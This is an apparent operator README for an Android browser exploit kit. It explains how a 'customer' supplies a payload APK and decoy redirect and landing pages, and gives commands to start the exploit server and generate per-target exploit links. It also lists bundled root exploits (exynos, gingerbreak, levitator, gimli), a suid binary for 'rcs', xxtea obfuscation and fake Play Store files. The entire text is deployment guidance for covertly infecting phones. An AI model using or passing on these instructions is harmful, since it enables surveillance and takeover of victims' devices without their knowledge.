N.B requires Python 2.7.3

a] Customer must provide:
   - an apk, that will be installed into the target device
   - a web page that will be used to create the redirect page and the
     landing page. Landing page is a bit of a misnomer since the flow
     is redirect page -> landing page. 
     
     The goal of the redirect page is to generate some entropy to
     enhance the exploit reliability, and then redirect towards the
     landing page, which does contain the exploit.
     

b] How to run the exploit


1] Start the server with:
   # ./webkit_rc3_plus_tea.py

2] Create at least an instance to be served:
   # ./add_exploit_instance.py 1316691816 192.168.69.229 libfingerprint.so redirect.html landing.html demov2.apk
  
   The first argument is the exploit id, which will be used to
   generate the link. Launching the tool without arguments will
   generate ad unused exploit id. 

   N.B.
   Once the server has been stop, all the existing instances whose
   status is either 'running' or 'finished' won't be served and need
   to be regenerated.

   Instances can be added while the server is running, once the apk
   has been uploaded to the device, the server won't serve the exploit
   anymore.

3] The link where the exploit will be served is:
   http://192.168.69.229/news/1316691816/page.cfm


c] Content of the folder 

webkit_rc3_plus_tea.py: server
add_exploit_instance.py: tool used to add exploit instances
libfingerprint.so: shared object, needed to create exploit instances
exp_server.py: 'exploit/apk server'
tea_compressed.js: js implementation of xxtea
play: folder containing fake play store files

e72uds : exynos exploit
gi21flm : gingerbreak exploit
le8s98 : levitator exploit
st21k : binario suid per rcs
g1ml329py : gimli exploit

